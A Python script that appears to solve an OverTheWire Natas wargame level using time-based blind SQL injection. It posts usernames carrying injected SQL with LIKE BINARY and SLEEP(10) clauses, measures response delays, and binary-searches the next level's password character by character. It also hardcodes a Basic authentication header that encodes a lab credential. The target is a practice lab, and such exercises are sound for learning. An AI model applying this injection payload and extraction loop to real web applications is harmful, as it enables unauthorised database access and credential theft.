import re
import math
import time
import requests

digits = [chr(i) for i in range (ord('0'), ord('9')+1)]
uppercase_letters = [chr(i) for i in range (ord('A'), ord('Z')+1)]
lowercase_letters = [chr(i) for i in range (ord('a'), ord('z')+1)]

valid_chars = digits + uppercase_letters + lowercase_letters

LOWER_BOUND = 0
UPPER_BOUND = len(valid_chars)

def is_equal(guess):
    query = """natas18" AND password LIKE BINARY '{}%' AND SLEEP(10); # """.format(guess)
    t1 = time.time()
    response = requests.post("http://natas17.natas.labs.overthewire.org/index.php",
                             data={"username": query},
                             headers={"Authorization": "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="})
    t2 = time.time()
    tdelta = t2-t1
    if tdelta < 10:
        return False
    return True

def is_less(guess):
    query = """natas18" AND BINARY password > '{}' AND SLEEP(10); # """.format(guess)
    t1 = time.time()
    response = requests.post("http://natas17.natas.labs.overthewire.org/index.php",
                             data={"username": query},
                             headers={"Authorization": "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="})
    t2 = time.time()
    tdelta = t2-t1
    if tdelta < 10:
        return False
    return True

def find_next_correct_char(password):
    lower_bound = LOWER_BOUND
    upper_bound = UPPER_BOUND
    index = int(math.floor(float(lower_bound+upper_bound)/2))
    while True:
        print("trying: ", valid_chars[index])
        guess = password + valid_chars[index]
        if is_equal(guess):
            return valid_chars[index]
        elif is_less(guess):
            lower_bound = index
            index = int(math.ceil(float(index+upper_bound)/2))
        else:
            upper_bound = index
            index = int(math.floor(float(lower_bound+index)/2))
    return None

if __name__ == '__main__':
    password = ""
    for i in range(32):
        c = find_next_correct_char(password)
        if not c:
            print("Failed to find next character.")
        password += c
        print("Updated password: %s" % password)
    print("\nFinal password: %s" % password)
